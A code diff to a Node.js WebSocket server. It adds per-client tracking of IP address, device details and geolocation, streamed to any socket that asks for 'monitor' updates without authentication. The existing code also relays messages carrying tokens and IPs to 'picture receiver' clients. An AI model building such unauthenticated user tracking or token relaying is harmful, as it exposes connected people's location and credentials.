@@ -5,6 +5,8 @@ import crypto from 'crypto';
 import fetch from 'node-fetch';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import geoip from 'geoip-lite';
+import useragent from 'useragent';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -13,7 +15,6 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
 const wss = new WebSocketServer({ noServer: true });
-
 
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
@@ -24,20 +25,27 @@ server.on('upgrade', (request, socket, head) => {
 // WebSocket logic
 const usersInChat = new Map();
 const pictureReceivers = new Map(); 
+const monitorConnections = new Set();
 let keepAliveId = null;
 
-wss.on("connection", (ws) => {
-    const userID = crypto.randomUUID();  
+wss.on("connection", (ws, req) => {
+    const userID = crypto.randomUUID();
+    const clientInfo = extractClientInfo(ws, req);
+    usersInChat.set(userID, clientInfo);
+
     ws.on("message", (data) => {
         handleMessage(ws, data, userID);
     });
+
     ws.on("close", () => {
-        handleDisconnect(userID);
-        ws.removeAllListeners(); 
+        handleDisconnect(userID, ws);
     });
+
     if (wss.clients.size === 1 && !keepAliveId) {
         keepServerAlive();
     }
+
+    sendClientUpdate();
 });
 
 wss.on("close", () => {
@@ -51,7 +59,10 @@ const handleMessage = (ws, data, userID) => {
     try {
         const messageData = JSON.parse(data.toString());
         
-        if (messageData.command === 'Picture Receiver') {
+        if (messageData.type === 'monitor') {
+            monitorConnections.add(ws);
+            sendClientUpdate();
+        } else if (messageData.command === 'Picture Receiver') {
             pictureReceivers.set(userID, ws);
         } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
             broadcastToPictureReceivers(messageData);
@@ -71,6 +82,14 @@ const handleMessage = (ws, data, userID) => {
             });
         } else {
             broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
+        }
+
+        // Update last active time
+        const clientInfo = usersInChat.get(userID);
+        if (clientInfo) {
+            clientInfo.lastActiveTime = new Date();
+            usersInChat.set(userID, clientInfo);
+            sendClientUpdate();
         }
     } catch (e) {
         console.error('Error parsing or processing message:', e);
@@ -97,9 +116,11 @@ const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) =>
     });
 };
 
-const handleDisconnect = (userID) => {
+const handleDisconnect = (userID, ws) => {
     usersInChat.delete(userID);
     pictureReceivers.delete(userID);
+    monitorConnections.delete(ws);
+    sendClientUpdate();
 };
 
 const keepServerAlive = () => {
@@ -111,6 +132,46 @@ const keepServerAlive = () => {
         });
     }, 30000);
 };
+
+function extractClientInfo(ws, req) {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgentString = req.headers['user-agent'];
+    const agent = useragent.parse(userAgentString);
+    const geoData = geoip.lookup(ip);
+
+    return {
+        ip: ip,
+        userAgent: {
+            browser: agent.toAgent(),
+            os: agent.os.toString(),
+            device: agent.device.toString(),
+        },
+        geoLocation: geoData ? {
+            country: geoData.country,
+            region: geoData.region,
+            city: geoData.city,
+            ll: geoData.ll,
+        } : null,
+        connectTime: new Date(),
+        lastActiveTime: new Date(),
+    };
+}
+
+function sendClientUpdate() {
+    const clientData = Array.from(usersInChat.entries()).map(([id, clientInfo]) => ({
+        id,
+        info: clientInfo
+    }));
+    const updateMessage = JSON.stringify({
+        type: 'clientUpdate',
+        clients: clientData
+    });
+    monitorConnections.forEach(ws => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(updateMessage);
+        }
+    });
+}
 
 // Camera viewer logic
 const cameraGroups = [
@@ -168,9 +229,12 @@ app.get('/', (req, res) => {
     res.status(200).send('');
 });
 
-// Chỉ phục vụ index.html khi truy cập /camera
 app.get('/camera', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/monitor', (req, res) => {
+    res.sendFile(path.join(__dirname, 'monitor.html'));
 });
 
 app.get('/image/:id', async (req, res) => {
